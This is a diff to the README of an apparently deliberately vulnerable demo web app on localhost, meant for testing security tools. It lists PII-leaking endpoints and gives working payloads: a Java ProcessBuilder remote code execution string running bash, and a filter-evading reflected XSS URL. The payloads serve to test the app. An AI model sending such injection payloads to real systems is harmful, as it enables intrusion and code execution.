@@ -19,34 +19,22 @@ Once the application starts, vulnerabilites and exposures in it can be tested wi
 
 ### Sensitive Data Leaks to Log
 
-| URL |  Purpose |
+| URL | Purpose |
 | --- | ------- |
-| `http://localhost:8081/customers/1` | Returns JSON representation of Customer resource based on Id (1) specified in URL |
-| `http://localhost:8081/customers` | Returns JSON representation of all available Customer resources |
-| `http://localhost:8081/patients`  | Returns JSON representation of all available patients in record |
-| `http://localhost:8081/account/1`  | Returns JSON representation of Account based on Id (1) specified |
-| `http://localhost:8081/account`  | Returns JSON representation of all available accounts and their details |
+| http://localhost:8081/customers/1 | Returns JSON representation of Customer resource based on Id (1) specified in URL |
+| http://localhost:8081/customers   | Returns JSON representation of all available Customer resources |
+| http://localhost:8081/patients    | Returns JSON representation of all available patients in record |
+| http://localhost:8081/account/1   | Returns JSON representation of Account based on Id (1) specified |
+| http://localhost:8081/account     | Returns JSON representation of all available accounts and their details |
 
 All the above requests leak sensitive medical and PII data to the logging service. In addition other endpoints such as `/saveSettings`, `/search/user`, `/admin/login` etc. are also available. Along with the list above, users can explore variations of `GET`, `POST` and `PUT` requests sent to these endpoints.
 
 ### Remote Code Execution
 
-An RCE can be triggered through the `/search/user` endpoint by sending a `POST` request as follows:
-```
-POST /search/user HTTP/1.1
-Host: localhost:8081
-User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:55.0) Gecko/20100101 Firefox/55.0
-Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
-Accept-Language: en-US,en;q=0.5
-Upgrade-Insecure-Requests: 1
-Content-Length: 86
-Pragma: no-cache
-Cache-Control: no-cache
-DNT: 1
-Connection: close
+An RCE can be triggered through the `/search/user` endpoint by sending a `GET` HTTP request as follows:
 
-new java.lang.ProcessBuilder({'/bin/bash','-c','echo "3vilhax0r">/tmp/hacked'}).start()
-```
+[http://localhost:8081/search/user?foo=new java.lang.ProcessBuilder({'/bin/bash','-c','echo 3vilhax0r>/tmp/hacked'}).start()](http://localhost:8081/search/user?foo=new%20java.lang.ProcessBuilder(%7B%27%2Fbin%2Fbash%27%2C%27-c%27%2C%27echo%203vilhax0r%3E%2Ftmp%2Fhacked%27%7D).start())
+
 This creates a file `/tmp/hacked` with the content `3vilhax0r`
 
 ### Arbritary File Write
@@ -76,8 +64,6 @@ Palo Alto;January;200,000
 
 A reflected XSS vulnerability exists in the application and can be triggered using the _hidden_ `/debug` endpoint as follows:
 
-```
-http://localhost:8081/debug?customerId=1&clientId=1&firstName=a&lastName=b&dateOfBirth=123&ssn=123&socialSecurityNum=1&tin=123&phoneNumber=5432<scriscriptpt>alert(1)</sscriptcript>
-```
+[http://localhost:8081/debug?customerId=1&clientId=1&firstName=a&lastName=b&dateOfBirth=123&ssn=123&socialSecurityNum=1&tin=123&phoneNumber=5432<scriscriptpt>alert(1)</sscriptcript>](http://localhost:8081/debug?customerId=1&clientId=1&firstName=a&lastName=b&dateOfBirth=123&ssn=123&socialSecurityNum=1&tin=123&phoneNumber=5432<scriscriptpt>alert(1)</sscriptcript>)
 
 It raises and alert dialogue and returns the Customer object data.
